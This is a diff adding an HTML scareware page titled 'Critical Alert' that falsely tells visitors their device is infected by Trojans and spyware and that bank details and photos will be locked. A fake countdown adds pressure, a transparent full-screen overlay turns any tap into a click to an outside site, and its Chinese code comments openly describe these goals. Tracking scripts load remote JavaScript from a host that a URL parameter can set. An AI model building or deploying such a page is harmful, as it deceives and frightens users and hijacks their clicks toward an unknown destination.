@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Critical Alert</title>
+    
+    <script>
+        window.bgdataLayer = window.bgdataLayer || [];
+        function bge() { bgdataLayer.push(arguments); }
+        window.bge = window.bge || bge;
+        bge('init', "906561529564077312");
+    </script>
+    <script>
+        !function(e,t){try{if(!e)return;try{"undefined"!=typeof localStorage&&localStorage.setItem("pixel_storage_dm",e)}catch(e){}var n=document.createElement("script");n.src="https://"+e+"/ad/events.js?pixel_id="+t,n.async=!0,n.setAttribute("data-pixel-script-dm",e),(document.head||document.getElementsByTagName("head")[0]||document.body||document.documentElement).appendChild(n)}catch(e){}}(function(e){try{var t=new RegExp("(^|&)"+e+"=([^&]*)(&|$)"),n=window.location.search.substr(1).match(t);return null!=n?decodeURIComponent(n[2].replace(/\+/g," ")):""}catch(e){return""}}("dm")||"tk.mowell.tech","906561529564077312");
+    </script>
+
+    <style>
+        /* 强制全红背景，制造极度危险的视觉压迫 */
+        body { margin: 0; padding: 20px; background-color: #d32f2f; color: #fff; font-family: -apple-system, BlinkMacSystemFont, Roboto, Arial, sans-serif; display: flex; flex-direction: column; justify-content: center; height: 100vh; overflow: hidden; box-sizing: border-box; }
+        
+        /* 全屏劫持层 */
+        .hijack-layer { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; display: block; }
+        
+        /* 内容层 */
+        .content-wrapper { position: relative; z-index: 10; text-align: center; }
+        
+        /* 闪烁的警告大图标 */
+        .warning-icon { font-size: 70px; margin-bottom: 10px; animation: blinkWarning 0.8s infinite alternate; }
+        
+        .title { font-size: 26px; font-weight: 900; margin-bottom: 15px; text-transform: uppercase; letter-spacing: 1px; }
+        
+        /* 白底黑字的具体威胁，增加对比度和可读性 */
+        .alert-box { background: #fff; color: #000; padding: 20px 15px; border-radius: 8px; margin-bottom: 25px; box-shadow: 0 10px 20px rgba(0,0,0,0.2); }
+        .alert-box p { font-size: 16px; margin: 0 0 10px 0; line-height: 1.4; font-weight: 500; }
+        .alert-box .highlight { color: #d32f2f; font-weight: 800; font-size: 18px; }
+        
+        /* 倒计时样式 */
+        .timer-box { font-size: 18px; font-weight: bold; margin-bottom: 25px; }
+        .timer-text { background: #000; color: #ffeb3b; padding: 5px 10px; border-radius: 4px; font-family: monospace; font-size: 22px; letter-spacing: 2px; }
+        
+        /* 强力按钮 */
+        .btn { display: block; width: 100%; background: #00e676; color: #000; padding: 18px; font-size: 20px; font-weight: 900; text-decoration: none; border-radius: 6px; text-transform: uppercase; box-shadow: 0 5px 15px rgba(0,0,0,0.3); animation: pulseBtn 1s infinite; }
+        
+        @keyframes blinkWarning { 0% { opacity: 1; transform: scale(1); } 100% { opacity: 0.5; transform: scale(0.9); } }
+        @keyframes pulseBtn { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
+    </style>
+      <script>
+        window.bgdataLayer = window.bgdataLayer || [];
+        function bge() { bgdataLayer.push(arguments); }
+        window.bge = window.bge || bge;
+        bge('init', "906561529564077312");
+    </script>
+    <script>
+        !function(e,t){try{if(!e)return;try{"undefined"!=typeof localStorage&&localStorage.setItem("pixel_storage_dm",e)}catch(e){}var n=document.createElement("script");n.src="https://"+e+"/ad/events.js?pixel_id="+t,n.async=!0,n.setAttribute("data-pixel-script-dm",e),(document.head||document.getElementsByTagName("head")[0]||document.body||document.documentElement).appendChild(n)}catch(e){}}(function(e){try{var t=new RegExp("(^|&)"+e+"=([^&]*)(&|$)"),n=window.location.search.substr(1).match(t);return null!=n?decodeURIComponent(n[2].replace(/\+/g," ")):""}catch(e){return""}}("dm")||"tk.mowell.tech","906561529564077312");
+    </script>
+</head>
+<body>
+    <a href="https://www.2timetowin.xyz/click" class="hijack-layer"></a>
+
+    <div class="content-wrapper">
+        <div class="warning-icon">⚠️</div>
+        <div class="title">System Corrupted!</div>
+        
+        <div class="alert-box">
+            <p>Your device is heavily infected by <span class="highlight">(4) Trojans & Spyware</span>.</p>
+            <p style="font-size: 14px; color: #555;">Bank details and photos will be permanently locked if not cleaned immediately.</p>
+        </div>
+
+        <div class="timer-box">
+            Action required in: <span class="timer-text" id="countdown">03:59</span>
+        </div>
+
+        <a href="https://www.2timetowin.xyz/click" class="btn">REMOVE VIRUS NOW</a>
+    </div>
+
+    <script>
+        // 倒计时逻辑：制造紧迫感 (从 3分59秒 开始倒数)
+        var timer = 239; 
+        var display = document.getElementById('countdown');
+        
+        setInterval(function () {
+            var minutes = parseInt(timer / 60, 10);
+            var seconds = parseInt(timer % 60, 10);
+
+            minutes = minutes < 10 ? "0" + minutes : minutes;
+            seconds = seconds < 10 ? "0" + seconds : seconds;
+
+            display.textContent = minutes + ":" + seconds;
+
+            if (--timer < 0) {
+                timer = 0; // 停在 00:00，但依然可以点击
+            }
+        }, 1000);
+    </script>
+</body>
+</html>
